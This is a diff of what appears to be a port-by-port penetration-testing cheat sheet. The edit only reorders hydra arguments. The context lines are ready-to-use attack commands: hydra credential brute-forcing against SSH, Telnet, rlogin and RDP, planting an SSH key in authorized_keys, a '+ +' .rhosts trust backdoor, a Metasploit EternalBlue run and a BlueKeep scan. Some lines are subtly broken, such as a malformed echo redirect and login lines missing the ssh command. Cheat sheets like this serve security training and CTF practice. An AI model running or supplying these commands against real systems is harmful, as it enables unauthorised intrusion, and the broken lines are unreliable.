@@ -284,7 +284,7 @@ ascii
 get file.txt -
 
 [*] (22) SSH
-hydra -L usernames -P passwords ssh://$TARGET -t35
+hydra ssh://$TARGET -L usernames -P passwords -t35
 
 ssh-keygen -f sshkey -N ''; cat sshkey.pub
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze' > $TARGET ~/.ssh/authorized_keys
@@ -293,7 +293,7 @@ $USERNAME@$TARGET -i sshkey.pub
 nano id_rsa; chmod 600 id_rsa; $USERNAME@$TARGET -i id_rsa -o PubkeyAcceptedAlgorithms=ssh-rsa
 
 [*] (23) Telnet
-hydra -L usernames -P passwords telnet://$TARGET -t35
+hydra telnet://$TARGET  -L usernames -P passwords -t35
 
 telnet --user $USERNAME $TARGET
 
@@ -379,7 +379,7 @@ download file.txt
 msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $TARGET; run'
 
 [*] (512-514) RSERVICES
-hydra -L usernames -P passwords rlogin://$TARGET -t35
+hydra rlogin://$TARGET -L usernames -P passwords -t35
 
 echo '+ +' > .rhosts; chmod 600 .rhosts
 rlogin $USERNAME@$TARGET
@@ -415,7 +415,7 @@ setpriv --reuid=1002 --regid=1002 --clear-groups -- ls -laR
 mysql -h "$TARGET" -u root@localhost -e 'show databases;'
 
 [*] (3389) RDP
-hydra -L usernames -P passwords rdp://$TARGET -t35
+hydra rdp://$TARGET -L usernames -P passwords -t35
 
 msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS $TARGET; run; exit"
 
